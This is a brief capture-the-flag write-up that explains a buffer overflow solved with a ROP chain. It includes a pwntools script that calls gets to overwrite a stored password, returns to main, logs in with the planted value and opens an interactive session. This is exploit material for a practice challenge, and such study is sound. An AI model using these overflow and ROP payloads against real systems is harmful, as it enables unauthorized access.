There were multiple vulnerabilities and multiple methods of exploitation for this challenge, so I chosen the simplest one. I used the BOF to achive a ROP attack, then I called `gets` with `good_pass` as argument and I updated it with a known value, then I jumped back to `main`. 

```python
rop = ROP(exe)
rop.gets(0x601060)
rop.main()

_sndal(':', cyclic(88) + rop.chain())
_sndal(':', '000')
_sndal('!', '12345\x00')
_sndal(':', 'misu')
_sndal(':', '12345')

io.interactive()
```
